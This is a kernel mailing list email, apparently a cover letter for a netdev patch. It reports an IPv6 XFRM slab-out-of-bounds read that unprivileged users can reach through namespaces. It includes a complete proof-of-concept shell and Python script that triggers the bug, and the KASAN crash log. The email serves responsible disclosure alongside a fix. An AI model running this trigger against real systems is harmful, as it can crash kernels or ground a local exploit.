Received: from mail-pl1-f178.google.com (mail-pl1-f178.google.com [209.85.214.178])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 32CBF40BCD8
	for <netdev@vger.kernel.org>; Mon,  3 Aug 2026 13:29:15 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.178
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785763762; cv=none; b=COHk6umDG6qHBMbXc2nB2xfjV7CKCuh73frd85LoFd2b1Q1pR4fs75SbnexR2bW5x/Ie7YhIJhAdqE1lKrhsI09leVW6hJ2shsBbI01xtUE1uxgcxMHJ+avuwMWqAxLmItd8NMPGPu8plrAmsuSuwaCWd9z7g3A4Tl1MYpZYJXg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785763762; c=relaxed/simple;
	bh=u58f8xkALCM09YReACM9zLKrT6N2LYxClztesrL8y7o=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=JbghYsFHH0KDYU4i9+MX7k5r0B+h6vtfUTTmABAtd5B2oaajcKV50ADcFg2tiymOjxXsr30FrMPxdS+S7yGwM6dnxwUreeXKr+km6Y4oWtYGXGdqG3kPpbx9+BBpjBBnrz90wP++RDvkq5+dIurxDfyl2g1fV6aMksMs+51sHuQ=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=AQDWNlN1; arc=none smtp.client-ip=209.85.214.178
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="AQDWNlN1"
Received: by mail-pl1-f178.google.com with SMTP id d9443c01a7336-2ceab75934dso38814505ad.2
        for <netdev@vger.kernel.org>; Mon, 03 Aug 2026 06:29:14 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785763752; x=1786368552; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=zb+rsMrtlrZIi52mXYgTmlSs31MjO5lu1CCxmOWiBOw=;
        b=AQDWNlN17QAfxMIrFfoQr8cwi9Lz12NgrH7btsD8ncs3P6r5A8zI9nFIS9BfowT2sh
         A1NhWyS8lPg3SXECiaOEuV3KApteUwAI3/bbS9WgljLtuXD4PWhnox922NEE+A5G9zec
         547RzYWS7NCGmIy0na34o8+g51kCVTui/qPS5Nk/zG0/ZItn2ehoeeu73GPpF7uHaMlm
         35BfjsiJcRQFG09iAexR9nK2qxim5AVa+dZSup04n/Hf9Vg0fK4qi+4CxqhIosko9PK7
         6+kKjNTjNrs/AXnn/WNTBXuSk2mmOUX6hmbLABFS8RBs8BVud55XS2vwt1yBpg5hFx7I
         2oXg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785763752; x=1786368552;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=zb+rsMrtlrZIi52mXYgTmlSs31MjO5lu1CCxmOWiBOw=;
        b=l3C53cfCRtDpOAUwO1683cdXV8M3jsMCfckHAfNvbV/rTYU7GBCOaD44BdEHPU1P4Z
         mBDAfAeC/9uiD62HheyrfUVv4HufDD/9bDKLWapcniVpqlPSkf5p3QdBDo9oaYL4WB+w
         8dXrASWm9UQxNdGlJyvOt+4WvFlHp0QGjl4lM7oyajHN9Ie08HKcuEHP2MJpqYduoGll
         v0MAJUKEsUO29LpPsUoA8rNDfHyqQxioDs+nNdNJqMuNanrUHoZWLlWGTZjHpwvBWh7a
         UvsI3CyBOtvHJxHNQtim7ISPJ2wEmOKx2iVa6RbLyDfwgjM2pOsS80ITjlrSOnALoDE5
         t1JA==
X-Gm-Message-State: AOJu0YwP6v5ZKgTBxkD++D5QZ6WaATXCBKQTzkw9s73zjfNqVFk8rBXy
	DJ7uebMKV16AkDNeaERtXurju++NxTlVcguHOP8Fe1h/pc7Ne+Wxz6WczfeJFbxNnmjzSApYiIh
	FM/yb73dLlPBAWw==
X-Gm-Gg: AR+sD13gIJu+w0ei9jOisxwJyKmvOY6bxdNTtVtVcP/2sZxT++LqpHmDU3axRmcqYRE
	Td+mL83uAd4P4L4zp47rm6P0PjvvM16wHPoX5qpgPtd1dig7r+oVtiIEVT+rwLhMaZHArZA+YmF
	QiRffvTqv4muXT7TzpNLHX+HFTjKnNcda2uDhLSBhpooUGdIolpJfctnl2cwk86H3AuAPe+jFtf
	KBkly0ToTRao2hHDeMA2sKdZY3DQ0zeEhiCmi6yovwVrWupDJCwcgJwyht1PuABrDA+o7XxCUnf
	WKSJAbBgQec95SovwvCpd/o8URy2S3Q/leF/g5xcb9NmAzNpR6CDgwBk/EW55A71cKQw28B3tJi
	yX5G9Uov5iRBwxFu8jP1T0G4ahuu4YKa7saq9D0vpWCmWN30VN25uu8aesxvW+pVNrlw2Efevx1
	/tQZF0zwjfqCFZ6qXkUaBpNSi8bWjoy8Qh5b0zS9A1IpR4/cCLIC0cccg3Vra0By/GqcpL8M9AM
	WAJRmvs6SSijjY=
X-Received: by 2002:a17:903:18d:b0:2c9:d277:2cdd with SMTP id d9443c01a7336-2d052268e8amr102063095ad.13.1785763751904;
        Mon, 03 Aug 2026 06:29:11 -0700 (PDT)
Received: from Roxy.localdomain ([203.175.14.32])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d04b1594b0sm37924575ad.71.2026.08.03.06.29.07
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 03 Aug 2026 06:29:10 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org
Cc: steffen.klassert@secunet.com,
	herbert@gondor.apana.org.au,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] ipv6: xfrm: use full sockets in local error paths
Date: Mon,  3 Aug 2026 21:28:57 +0800
Message-ID: <cover.1785761237.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv6/xfrm6_output.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

tcp_v6_send_synack() sends the SYN-ACK through ip6_xmit() with the full
listener socket, but the skb owner remains the TCP_NEW_SYN_RECV
request_sock created for the half-open connection.

If LOCAL_OUT rewrites the skb mark and reroutes the packet into an IPv6
XFRM tunnel with a lower MTU, __xfrm6_output() reaches xfrm_local_error().
xfrm6_local_error() and xfrm6_local_rxpmtu() then use skb->sk directly and
treat it as a full IPv6 socket.

When skb->sk is still the request_sock, ipv6_local_error() dereferences
full-socket IPv6 state from the smaller request_sock object and triggers a
slab-out-of-bounds read.

The fix resolves the owner with skb_to_full_sk() in both callbacks and
returns when no full socket is attached.

Reproducer:

    chmod +x ~/poc.sh
    bash ~/poc.sh --userns

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/bash
set -euo pipefail
export PATH="/usr/sbin:/sbin:/usr/bin:/bin:${PATH:-}"

# Root mode:   ./poc.sh
# Userns mode: ./poc.sh --userns

if [[ "${1:-}" == "--userns" && -z "${POC_INNER_USERNS:-}" ]]; then
	exec unshare -Urnm env POC_INNER_USERNS=1 bash "$0"
fi

if [[ "${1:-}" == "--userns" ]]; then
	shift
fi

require_cmd() {
	command -v "$1" >/dev/null 2>&1 || {
		echo "missing command: $1" >&2
		exit 1
	}
}

require_cmd ip
require_cmd ip6tables
require_cmd nsenter
require_cmd python3
require_cmd unshare

sid=$$
srv_if="pocs${sid}"
cli_if="pocc${sid}"
port=12349

inner_srv="2001:db8:1::1"
inner_cli="2001:db8:1::2"
outer_srv="2001:db8:2::1"
outer_cli="2001:db8:2::2"
outer_mtu=96

client_pidfile="/tmp/poc-client-pid.${sid}"
client_holder=""

cleanup() {
	set +e
	if [[ -n "${client_holder}" ]]; then
		kill "${client_holder}" 2>/dev/null || true
		wait "${client_holder}" 2>/dev/null || true
	fi
	ip link del "${srv_if}" 2>/dev/null || true
	rm -f "${client_pidfile}"
}
trap cleanup EXIT

unshare -n --fork sh -c 'echo $$ > "$1"; exec sleep 600' sh "${client_pidfile}" &
client_holder=$!

for _ in $(seq 1 100); do
	if [[ -s "${client_pidfile}" ]]; then
		break
	fi
	sleep 0.05
done

client_pid=$(cat "${client_pidfile}")

ip link add "${srv_if}" type veth peer name "${cli_if}"
ip link set "${cli_if}" netns "${client_pid}"

ip link set lo up
ip link set "${srv_if}" up mtu 1500
ip addr add "${inner_srv}/64" dev "${srv_if}" nodad
ip addr add "${outer_srv}/64" dev "${srv_if}" nodad

nsenter -t "${client_pid}" -n ip link set lo up
nsenter -t "${client_pid}" -n ip link set "${cli_if}" up mtu 1500
nsenter -t "${client_pid}" -n ip addr add "${inner_cli}/64" dev "${cli_if}" nodad
nsenter -t "${client_pid}" -n ip addr add "${outer_cli}/64" dev "${cli_if}" nodad

srv_mac=$(ip link show dev "${srv_if}" | sed -n 's/.*link\/ether \([^ ]*\).*/\1/p')
cli_mac=$(nsenter -t "${client_pid}" -n ip link show dev "${cli_if}" | sed -n 's/.*link\/ether \([^ ]*\).*/\1/p')

ip neigh replace "${inner_cli}" lladdr "${cli_mac}" dev "${srv_if}" nud permanent
ip neigh replace "${outer_cli}" lladdr "${cli_mac}" dev "${srv_if}" nud permanent
nsenter -t "${client_pid}" -n ip neigh replace "${inner_srv}" lladdr "${srv_mac}" dev "${cli_if}" nud permanent
nsenter -t "${client_pid}" -n ip neigh replace "${outer_srv}" lladdr "${srv_mac}" dev "${cli_if}" nud permanent

# xfrm_bundle_create() keeps the SYN-ACK's original flowi6_oif, so the outer
# tunnel endpoint must be reachable through the same interface as the inner flow.
ip -6 route add "${outer_cli}/128" dev "${srv_if}" src "${outer_srv}" mtu "${outer_mtu}"

sysctl -q -w net.ipv4.tcp_syncookies=0

ip -6 xfrm state add \
	src "${outer_srv}" dst "${outer_cli}" \
	proto esp spi 0x100 reqid 0x1 mode tunnel \
	auth 'hmac(sha256)' 0x1111111111111111111111111111111111111111111111111111111111111111 \
	enc 'cbc(aes)' 0x22222222222222222222222222222222

ip -6 xfrm policy add \
	dir out mark 0x1 mask 0xffffffff \
	src "${inner_srv}/128" dst "${inner_cli}/128" \
	tmpl src "${outer_srv}" dst "${outer_cli}" proto esp reqid 0x1 mode tunnel

ip6tables -t mangle -F
ip6tables -t mangle -A OUTPUT \
	-p tcp --tcp-flags SYN,ACK SYN,ACK \
	-d "${inner_cli}" \
	-j MARK --set-mark 1

python3 - <<PY &
import socket
import time

s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("${inner_srv}", ${port}, 0, 0))
s.listen(1)
print("server-listening", flush=True)
time.sleep(30)
PY
server_pid=$!

sleep 1

nsenter -t "${client_pid}" -n python3 - <<PY
import socket
import time

s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
s.bind(("${inner_cli}", 0, 0, 0))
s.settimeout(3)
try:
    s.connect(("${inner_srv}", ${port}, 0, 0))
    print("connect-ok")
except Exception as exc:
    print(f"connect-exc {exc!r}")
time.sleep(1)
PY

kill "${server_pid}" 2>/dev/null || true
wait "${server_pid}" 2>/dev/null || true

------END poc.sh--------

----BEGIN crash log----

[  261.176289] [      C0] ==================================================================
[  261.176994] [      C0] BUG: KASAN: slab-out-of-bounds in ipv6_local_error+0x3a/0x840
[  261.177563] [      C0] Read of size 8 at addr ffff888113a78568 by task python3/10601

[  261.178283] [      C0] CPU: 0 UID: 1028 PID: 10601 Comm: python3 Not tainted 6.12.95 #2
[  261.178289] [      C0] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  261.178318] [      C0] Call Trace:
[  261.178335] [      C0]  <IRQ>
[  261.178340] [      C0]  dump_stack_lvl+0x78/0xe0
[  261.178379] [      C0]  print_report+0xc6/0x620
[  261.178412] [      C0]  ? ipv6_local_error+0x3a/0x840
[  261.178416] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178430] [      C0]  ? __virt_addr_valid+0x1f3/0x3d0
[  261.178451] [      C0]  ? ipv6_local_error+0x3a/0x840
[  261.178455] [      C0]  kasan_report+0xd8/0x110
[  261.178463] [      C0]  ? ipv6_local_error+0x3a/0x840
[  261.178473] [      C0]  kasan_check_range+0xf4/0x1a0
[  261.178483] [      C0]  ipv6_local_error+0x3a/0x840
[  261.178492] [      C0]  xfrm6_local_error+0x1f6/0x2e0
[  261.178501] [      C0]  ? __pfx_xfrm6_local_error+0x10/0x10
[  261.178512] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178516] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178525] [      C0]  xfrm_local_error+0xed/0x1a0
[  261.178537] [      C0]  __xfrm6_output+0xa48/0xc50
[  261.178545] [      C0]  xfrm6_output+0x136/0x480
[  261.178551] [      C0]  ? __pfx_xfrm6_output+0x10/0x10
[  261.178554] [      C0]  ? trace_lock_acquire+0x145/0x1c0
[  261.178577] [      C0]  ? __pfx___xfrm6_output+0x10/0x10
[  261.178582] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178591] [      C0]  ip6_xmit+0x1802/0x1c20
[  261.178599] [      C0]  ? __pfx___lock_acquire+0x10/0x10
[  261.178611] [      C0]  ? __pfx_ip6_xmit+0x10/0x10
[  261.178619] [      C0]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  261.178623] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178627] [      C0]  ? rcu_is_watching+0x12/0xc0
[  261.178642] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178645] [      C0]  ? trace_lock_acquire+0x145/0x1c0
[  261.178650] [      C0]  ? tcp_v6_send_synack+0x4a5/0xcf0
[  261.178660] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178668] [      C0]  tcp_v6_send_synack+0x5ae/0xcf0
[  261.178676] [      C0]  ? __pfx_tcp_v6_send_synack+0x10/0x10
[  261.178685] [      C0]  ? __pfx_inet_csk_reqsk_queue_hash_add+0x10/0x10
[  261.178714] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178722] [      C0]  tcp_conn_request+0x1fec/0x35d0
[  261.178742] [      C0]  ? __pfx_tcp_conn_request+0x10/0x10
[  261.178748] [      C0]  ? __lock_acquire+0xc96/0x3c40
[  261.178756] [      C0]  ? lock_acquire.part.0+0x119/0x370
[  261.178761] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178773] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178784] [      C0]  ? tcp_rcv_state_process+0x3fc/0x5010
[  261.178790] [      C0]  tcp_rcv_state_process+0x3fc/0x5010
[  261.178796] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178802] [      C0]  ? sk_filter_trim_cap+0x3fa/0x9a0
[  261.178826] [      C0]  ? __pfx_lock_release+0x10/0x10
[  261.178832] [      C0]  ? __pfx_tcp_rcv_state_process+0x10/0x10
[  261.178838] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178852] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178858] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178861] [      C0]  ? sk_filter_trim_cap+0x404/0x9a0
[  261.178866] [      C0]  ? __pfx_tcp_inbound_hash+0x10/0x10
[  261.178878] [      C0]  ? tcp_v6_do_rcv+0x680/0x1430
[  261.178882] [      C0]  tcp_v6_do_rcv+0x680/0x1430
[  261.178886] [      C0]  ? __asan_memcpy+0x3c/0x60
[  261.178891] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178898] [      C0]  tcp_v6_rcv+0x3064/0x39b0
[  261.178916] [      C0]  ? raw6_local_deliver+0x3b1/0x8a0
[  261.178922] [      C0]  ? __pfx_tcp_v6_rcv+0x10/0x10
[  261.178931] [      C0]  ? __pfx_raw6_local_deliver+0x10/0x10
[  261.178936] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178939] [      C0]  ? lock_acquire.part.0+0x119/0x370
[  261.178945] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178952] [      C0]  ip6_protocol_deliver_rcu+0x12c/0x1450
[  261.178956] [      C0]  ? trace_lock_acquire+0x145/0x1c0
[  261.178964] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.178971] [      C0]  ? __pfx_ipv6_rcv+0x10/0x10
[  261.178975] [      C0]  ? process_backlog+0x38c/0x1400
[  261.178984] [      C0]  ip6_input_finish+0x11b/0x240
[  261.178987] [      C0]  ? ip6_input+0x78/0xb0
[  261.178992] [      C0]  __netif_receive_skb_one_core+0x11a/0x1b0
[  261.178998] [      C0]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  261.179005] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179008] [      C0]  ? lock_acquire+0x2f/0xb0
[  261.179012] [      C0]  ? process_backlog+0x38c/0x1400
[  261.179019] [      C0]  process_backlog+0x3cc/0x1400
[  261.179030] [      C0]  __napi_poll.constprop.0+0xa1/0x440
[  261.179037] [      C0]  net_rx_action+0x928/0xe20
[  261.179050] [      C0]  ? __pfx_net_rx_action+0x10/0x10
[  261.179053] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179058] [      C0]  ? clockevents_program_event+0xef/0x2c0
[  261.179077] [      C0]  ? __pfx_lock_release+0x10/0x10
[  261.179094] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179097] [      C0]  ? mark_held_locks+0x94/0xe0
[  261.179106] [      C0]  handle_softirqs+0x2ae/0x8b0
[  261.179126] [      C0]  ? __pfx_handle_softirqs+0x10/0x10
[  261.179131] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179135] [      C0]  ? irqtime_account_irq+0x24/0x2e0
[  261.179149] [      C0]  ? __dev_queue_xmit+0x897/0x37e0
[  261.179154] [      C0]  do_softirq+0xb2/0xf0
[  261.179160] [      C0]  </IRQ>
[  261.179162] [      C0]  <TASK>
[  261.179164] [      C0]  __local_bh_enable_ip+0x101/0x120
[  261.179169] [      C0]  ? __dev_queue_xmit+0x897/0x37e0
[  261.179172] [      C0]  __dev_queue_xmit+0x8ac/0x37e0
[  261.179185] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179189] [      C0]  ? hlock_class+0x4e/0x130
[  261.179192] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179195] [      C0]  ? mark_lock+0xb5/0xc60
[  261.179200] [      C0]  ? __pfx___lock_acquire+0x10/0x10
[  261.179207] [      C0]  ? __pfx___dev_queue_xmit+0x10/0x10
[  261.179214] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179217] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179220] [      C0]  ? find_held_lock+0x2d/0x110
[  261.179227] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179231] [      C0]  ? ip6_finish_output2+0x54f/0x15e0
[  261.179241] [      C0]  ? __pfx_lock_release+0x10/0x10
[  261.179244] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179251] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179255] [      C0]  ? __asan_memcpy+0x3c/0x60
[  261.179259] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179262] [      C0]  ? eth_header+0x154/0x180
[  261.179274] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179278] [      C0]  ? neigh_resolve_output+0x41e/0x8b0
[  261.179296] [      C0]  ip6_finish_output2+0x54f/0x15e0
[  261.179308] [      C0]  ip6_finish_output+0x4d3/0xd10
[  261.179317] [      C0]  ip6_xmit+0x10b5/0x1c20
[  261.179321] [      C0]  ? __pfx___lock_acquire+0x10/0x10
[  261.179333] [      C0]  ? __pfx_ip6_xmit+0x10/0x10
[  261.179340] [      C0]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  261.179344] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179348] [      C0]  ? rcu_is_watching+0x12/0xc0
[  261.179353] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179356] [      C0]  ? trace_lock_acquire+0x145/0x1c0
[  261.179361] [      C0]  ? inet6_csk_xmit+0x139/0x5a0
[  261.179367] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179375] [      C0]  inet6_csk_xmit+0x339/0x5a0
[  261.179381] [      C0]  ? __pfx_inet6_csk_xmit+0x10/0x10
[  261.179393] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179402] [      C0]  __tcp_transmit_skb+0x1794/0x3950
[  261.179411] [      C0]  ? try_charge_memcg+0x4e3/0xb00
[  261.179424] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179432] [      C0]  ? __pfx___tcp_transmit_skb+0x10/0x10
[  261.179437] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179443] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179446] [      C0]  ? tcp_call_bpf+0x20b/0x2f0
[  261.179458] [      C0]  ? ktime_get+0x16b/0x200
[  261.179467] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179474] [      C0]  tcp_connect+0x270e/0x4c80
[  261.179486] [      C0]  ? __pfx_tcp_fastopen_defer_connect+0x10/0x10
[  261.179496] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179506] [      C0]  ? __pfx___inet_hash_connect+0x10/0x10
[  261.179512] [      C0]  ? __pfx_tcp_connect+0x10/0x10
[  261.179524] [      C0]  tcp_v6_connect+0x1309/0x1f20
[  261.179535] [      C0]  ? __pfx_tcp_v6_connect+0x10/0x10
[  261.179539] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179542] [      C0]  ? __lock_acquire+0x1249/0x3c40
[  261.179557] [      C0]  ? mark_lock+0xb5/0xc60
[  261.179561] [      C0]  ? __pfx___lock_acquire+0x10/0x10
[  261.179572] [      C0]  ? __inet_stream_connect+0x360/0xf40
[  261.179583] [      C0]  __inet_stream_connect+0x360/0xf40
[  261.179588] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179591] [      C0]  ? find_held_lock+0x2d/0x110
[  261.179598] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179603] [      C0]  ? __pfx___inet_stream_connect+0x10/0x10
[  261.179607] [      C0]  ? __pfx_lock_release+0x10/0x10
[  261.179614] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179617] [      C0]  ? mark_held_locks+0x94/0xe0
[  261.179621] [      C0]  ? inet_stream_connect+0x43/0xa0
[  261.179626] [      C0]  ? __local_bh_enable_ip+0xa7/0x120
[  261.179634] [      C0]  inet_stream_connect+0x57/0xa0
[  261.179640] [      C0]  __sys_connect+0x117/0x130
[  261.179652] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179656] [      C0]  ? __pfx___sys_connect+0x10/0x10
[  261.179671] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.179679] [      C0]  __x64_sys_connect+0x72/0xb0
[  261.179688] [      C0]  ? lockdep_hardirqs_on+0x7b/0x110
[  261.179708] [      C0]  do_syscall_64+0xc7/0x270
[  261.179719] [      C0]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  261.179732] [      C0] RIP: 0033:0x7f8969024687
[  261.179761] [      C0] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  261.179765] [      C0] RSP: 002b:00007fff2ddca8c0 EFLAGS: 00000202 ORIG_RAX: 000000000000002a
[  261.179779] [      C0] RAX: ffffffffffffffda RBX: 00007f8968f90780 RCX: 00007f8969024687
[  261.179782] [      C0] RDX: 000000000000001c RSI: 00007fff2ddca960 RDI: 0000000000000003
[  261.179785] [      C0] RBP: 00007fff2ddca960 R08: 0000000000000000 R09: 0000000000000000
[  261.179787] [      C0] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000a83590
[  261.179789] [      C0] R13: 0000000000000001 R14: 000000000000001c R15: 00007f89692cc080
[  261.179816] [      C0]  </TASK>

[  261.243718] [      C0] The buggy address belongs to the object at ffff888113a783b8
                           which belongs to the cache request_sock_TCPv6 of size 344
[  261.244669] [      C0] The buggy address is located 88 bytes to the right of
                           allocated 344-byte region [ffff888113a783b8, ffff888113a78510)

[  261.245770] [      C0] The buggy address belongs to the physical page:
[  261.246211] [      C0] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0xffff888113a781e0 pfn:0x113a78
[  261.246860] [      C0] head: order:1 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[  261.247412] [      C0] memcg:ffff88811259f541
[  261.247685] [      C0] flags: 0x17ff00000000240(workingset|head|node=0|zone=2|lastcpupid=0x7ff)
[  261.248251] [      C0] page_type: f5(slab)
[  261.248549] [      C0] raw: 017ff00000000240 ffff88810c94aac0 ffff888020f2f848 ffff888020f2f848
[  261.249110] [      C0] raw: ffff888113a781e0 0000000000110001 00000001f5000000 ffff88811259f541
[  261.249656] [      C0] head: 017ff00000000240 ffff88810c94aac0 ffff888020f2f848 ffff888020f2f848
[  261.250230] [      C0] head: ffff888113a781e0 0000000000110001 00000001f5000000 ffff88811259f541
[  261.250776] [      C0] head: 017ff00000000001 ffffea00044e9e01 ffffffffffffffff 0000000000000000
[  261.251343] [      C0] head: ffff888100000002 0000000000000000 00000000ffffffff 0000000000000000
[  261.251899] [      C0] page dumped because: kasan: bad access detected
[  261.252322] [      C0] page_owner tracks the page as allocated
[  261.252688] [      C0] page last allocated via order 1, migratetype Unmovable, gfp_mask 0x52820(GFP_ATOMIC|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP), pid 10601, tgid 10601 (python3), ts 261175482560, free_ts 260997245625
[  261.253933] [      C0]  post_alloc_hook+0x181/0x1b0
[  261.254258] [      C0]  get_page_from_freelist+0x7b0/0x3b60
[  261.254609] [      C0]  __alloc_pages_noprof+0x224/0x26d0
[  261.254963] [      C0]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[  261.255325] [      C0]  new_slab+0x2e5/0x420
[  261.255605] [      C0]  ___slab_alloc+0xe60/0x19e0
[  261.255923] [      C0]  __slab_alloc.isra.0+0x5b/0xb0
[  261.256246] [      C0]  kmem_cache_alloc_noprof+0x281/0x2c0
[  261.256598] [      C0]  inet_reqsk_alloc+0x93/0x6e0
[  261.256920] [      C0]  tcp_conn_request+0x2db/0x35d0
[  261.257245] [      C0]  tcp_rcv_state_process+0x3fc/0x5010
[  261.257595] [      C0]  tcp_v6_do_rcv+0x680/0x1430
[  261.257914] [      C0]  tcp_v6_rcv+0x3064/0x39b0
[  261.258213] [      C0]  ip6_protocol_deliver_rcu+0x12c/0x1450
[  261.258578] [      C0]  ip6_input_finish+0x11b/0x240
[  261.258909] [      C0]  __netif_receive_skb_one_core+0x11a/0x1b0
[  261.259311] [      C0] page last free pid 10601 tgid 10601 stack trace:
[  261.259749] [      C0]  free_unref_page+0x6a3/0x1050
[  261.260070] [      C0]  qlist_free_all+0x54/0x120
[  261.260369] [      C0]  kasan_quarantine_reduce+0x192/0x1e0
[  261.260747] [      C0]  __kasan_slab_alloc+0x69/0x90
[  261.261065] [      C0]  __kmalloc_cache_noprof+0x10b/0x2f0
[  261.261416] [      C0]  tomoyo_init_log+0x18e/0x1ea0
[  261.261771] [      C0]  tomoyo_supervisor+0x438/0xef0
[  261.262092] [      C0]  tomoyo_env_perm+0x175/0x1e0
[  261.262408] [      C0]  tomoyo_find_next_domain+0xcbd/0x1d10
[  261.262784] [      C0]  tomoyo_bprm_check_security+0x112/0x1a0
[  261.263154] [      C0]  security_bprm_check+0x62/0xd0
[  261.263491] [      C0]  bprm_execve+0x5a1/0x1530
[  261.263809] [      C0]  do_execveat_common.isra.0+0x3cc/0x4f0
